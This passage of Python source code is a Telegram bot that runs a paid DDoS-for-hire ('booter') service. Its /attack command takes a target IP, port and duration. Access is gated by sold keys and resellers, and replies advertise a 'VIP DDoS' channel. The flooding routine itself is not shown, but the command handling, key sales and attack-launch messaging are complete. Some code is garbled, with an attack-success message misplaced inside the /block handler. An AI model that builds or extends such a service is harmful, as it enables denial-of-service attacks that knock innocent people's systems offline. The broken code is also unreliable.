        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/help", "", response)

@bot.message_handler(commands=['feedback'])
def submit_feedback(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["feedback"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    command_parts = command.split(maxsplit=2)
    if len(command_parts) < 2:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📝 Feedback Submission Guide</i></b>\n"
            f"<b><i>Usage: /feedback <attack_id> <your_feedback></i></b>\n"
            f"<b><i>Example: /feedback 12345 Attack was awesome!</i></b>\n"
            f"<b><i>💡 Tip: You can attach media (photo/video)!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/feedback", f"Command: {command}", response)
        return

    attack_id = command_parts[1]
    feedback_text = command_parts[2] if len(command_parts) == 3 else ""
    media_file_id = ""

    if message.photo:
        media_file_id = message.photo[-1].file_id
    elif message.video:
        media_file_id = message.video.file_id
    elif message.document:
        media_file_id = message.document.file_id

    if not feedback_text and not media_file_id:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Bhai, feedback mein kuch toh daal!</i></b>\n"
            f"<b><i>Text ya media (photo/video) chahiye.</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/feedback", f"Command: {command}", response)
        return

    if has_submitted_feedback(user_id, attack_id):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>😅 You already submitted feedback for attack {attack_id}!</i></b>\n"
            f"<b><i>Ek baar hi kafi hai, bhai!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/feedback", f"Attack ID: {attack_id}", response)
        return

    if is_duplicate_feedback(user_id, feedback_text, media_file_id):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>😡 Ye feedback toh duplicate hai!</i></b>\n"
            f"<b><i>Naya feedback daal, warna next attack nahi hoga.</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/feedback", f"Attack ID: {attack_id}, Feedback: {feedback_text}, Media: {media_file_id}", response)
        return

    save_feedback(user_id, attack_id, feedback_text, media_file_id, chat_type)
    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>🎉 Feedback Submitted Successfully for Attack {attack_id}! 🎉</i></b>\n"
        f"<b><i>📝 Feedback: {feedback_text or 'Media only'}</i></b>\n"
        f"<b><i>📸 Media: {'Yes' if media_file_id else 'No'}</i></b>\n"
        f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
    )
    if is_overlord(user_id, username):
        response += (
            f"<b><i>🙌 Overlord ji, aapka feedback sunke dil khush ho gaya!</i></b>\n"
            f"<b><i>😍 Lala ga bot aapke liye!</i></b>\n"
        )
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/feedback", f"Attack ID: {attack_id}, Feedback: {feedback_text}, Media: {media_file_id}, Chat Type: {chat_type}", response)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["attack"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    has_access = False
    if is_admin(user_id, username):
        has_access = True
    elif user_id in users:
        try:
            user_info = users[user_id]
            expiration_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date and has_valid_context(user_id, chat_type):
                has_access = True
        except (ValueError, KeyError):
            has_access = False
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id]['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_access = True
        except (ValueError, KeyError):
            has_access = False

    if not has_access:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 BSDK, access nahi hai!</i></b>\n"
            f"<b><i>{chat_type.capitalize()} key le @Rahul_618 se ya admin se authorize karwa!</i></b>\n"
            f"<b><i>🔑 Contact: @Rahul_618</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 4:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Attack Command Guide</i></b>\n"
            f"<b><i>Usage: /attack <ip> <port> <time></i></b>\n"
            f"<b><i>Example: /attack 192.168.1.1 80 100</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    try:
        target, port, time = command_parts[1], int(command_parts[2]), int(command_parts[3])
        max_time = 320 if chat_type == 'group' else 180
        if time > max_time or time <= 0:
            response = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<b><i>❌ Error: Time must be between 1 and {max_time} seconds!</i></b>\n"
                f"<b><i>Try a valid duration.</i></b>\n"
                f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
                f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
                f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
                f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
                f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/attack", f"Command: {command}", response)
            return

        attack_id = ''.join(random.choices('0123456789', k=5))
        execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id, attack_id)
    except ValueError:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Invalid port or time! Use numbers.</i></b>\n"
            f"<b><i>Example: /attack 192.168.1.1 80 100</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 classificChat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["add"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_admin(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Admin only command!</i></b>\n"
            f"<b><i>Sirf admins users add kar sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return

    command_parts = command.split(maxsplit=2)
    if len(command_parts) < 2:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Add User Guide</i></b>\n"
            f"<b><i>Usage: /add <user_id> [duration]</i></b>\n"
            f"<b><i>Durations: 1min, 1h, 1d, 7d, 1m</i></b>\n"
            f"<b><i>Example: /add 123456789 1d</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return

    user_to_add = command_parts[1]
    duration = command_parts[2] if len(command_parts) == 3 else "1d"
    minutes, hours, days, months = parse_duration(duration)
    if minutes is None:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Invalid duration! Use: 1min, 1h, 1d, 7d, 1m</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return

    expiration = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
    authorized_users[user_to_add] = {
        "expiration": expiration.strftime('%Y-%m-%d %I:%M:%S %p'),
        "added_by": user_id,
        "chat_type": chat_type
    }
    save_data()
    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>✅ User Authorized Successfully!</i></b>\n"
        f"<b><i>🆔 UserID: {user_to_add}</i></b>\n"
        f"<b><i>⏳ Expires: {expiration.strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>👤 Added by: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/add", f"User ID: {user_to_add}, Duration: {duration}", response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["remove"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_admin(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Admin only command!</i></b>\n"
            f"<b><i>Sirf admins users remove kar sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return

    command_parts = command.split(maxsplit=1)
    if len(command_parts) != 2:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Remove User Guide</i></b>\n"
            f"<b><i>Usage: /remove <user_id></i></b>\n"
            f"<b><i>Example: /remove 123456789</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return

    user_to_remove = command_parts[1]
    if user_to_remove in authorized_users:
        del authorized_users[user_to_remove]
        if user_to_remove in users:
            del users[user_to_remove]
        save_data()
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🗑️ User Removed Successfully!</i></b>\n"
            f"<b><i>🆔 UserID: {user_to_remove}</i></b>\n"
            f"<b><i>👤 Removed by: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
    else:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ UserID {user_to_remove} not found!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/remove", f"User ID: {user_to_remove}", response)

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["block"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_admin(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Admin only command!</i></b>\n"
            f"<b><i>Sirf admins keys block kar sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Command: {command}", response)
        return

    command_parts = command.split(maxsplit=1)
    if len(command_parts) != 2:
        response = (
    f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    f"<b><i>💥 Attack Sent Successfully! 💥</i></b>\n"
    f"<b><i>🎯 Target: {target}:{port}</i></b>\n"
    f"<b><i>⏳ Duration: {time} seconds</i></b>\n"
    f"<b><i>📦 Packet Size: {packet_size} bytes</i></b>\n"
    f"<b><i>🔥 Threads: 1200</i></b>\n"
    f"<b><i>👤 Attacker: @{username} (UserID: {user_id})</i></b>\n"
    f"<b><i>🆔 Attack ID: {attack_id}</i></b>\n"
    f"<b><i>📍 Chat Type: {'Group' if bot.get_chat(chat_id).type in ['group', 'supergroup'] else 'DM'}</i></b>\n"
    f"<b><i>📝 Feedback Required: Use /feedback {attack_id} <your_feedback> after attack completes.</i></b>\n"
    f"<b><i>🔗 Join VIP DDoS: https://t.me/devil_ddos</i></b>\n"
    f"<b><i>📅 Launched: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
    f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
    f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
    f"━━━━━━━━━━━━━━━━━━━━━━━━━"
)
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Command: {command}", response)
        return

    key_to_block = command_parts[1]
    if key_to_block in keys:
        keys[key_to_block]["blocked"] = True
        save_data()
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🔒 Key Blocked Successfully!</i></b>\n"
            f"<b><i>🔑 Key: {key_to_block}</i></b>\n"
            f"<b><i>👤 Blocked by: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
    else:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Key {key_to_block} not found!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/block", f"Key: {key_to_block}", response)

@bot.message_handler(commands=['logs'])
def view_logs(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["logs"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_admin(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Admin only command!</i></b>\n"
            f"<b><i>Sirf admins logs dekh sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/logs", "", response)
        return

    try:
        with open(LOG_FILE, 'r', encoding='utf-8') as file:
            logs = file.readlines()
        log_entries = []
        current_entry = []
        for line in logs:
            if line.strip() == "----------------------------------------":
                if current_entry:
                    log_entries.append("".join(current_entry).strip())
                    current_entry = []
            else:
                current_entry.append(line)
        if current_entry:
            log_entries.append("".join(current_entry).strip())

        log_entries.reverse()  # Show newest logs first
        max_logs = 5  # Limit to last 5 log entries
        log_text = "\n\n".join(log_entries[:max_logs]) or "No logs available."
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📜 Recent Logs (Last {max_logs})</i></b>\n"
            f"<b><i>👤 Admin: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{log_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/logs", "", response)
    except FileNotFoundError:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Log file not found!</i></b>\n"
            f"<b><i>👤 Admin: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/logs", "", response, "Log file not found")

@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["users"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_admin(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Admin only command!</i></b>\n"
            f"<b><i>Sirf admins users list dekh sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/users", "", response)
        return

    user_list = []
    for uid, info in users.items():
        user_list.append(
            f"🆔 UserID: {uid}\n"
            f"⏳ Expires: {info['expiration']}\n"
            f"📍 Chat Type: {info.get('context', 'Unknown')}\n"
            f"━━━━━━━━━━━━"
        )
    for uid, info in authorized_users.items():
        user_list.append(
            f"🆔 UserID: {uid}\n"
            f"⏳ Expires: {info['expiration']}\n"
            f"📍 Chat Type: {info.get('chat_type', 'Unknown')}\n"
            f"👤 Added by: {info.get('added_by', 'Unknown')}\n"
            f"━━━━━━━━━━━━"
        )

    user_text = "\n".join(user_list) or "No users found."
    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>👥 Authorized Users List</i></b>\n"
        f"<b><i>👤 Admin: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{user_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/users", "", response)

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["resellers"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_admin(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Admin only command!</i></b>\n"
            f"<b><i>Sirf admins resellers list dekh sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
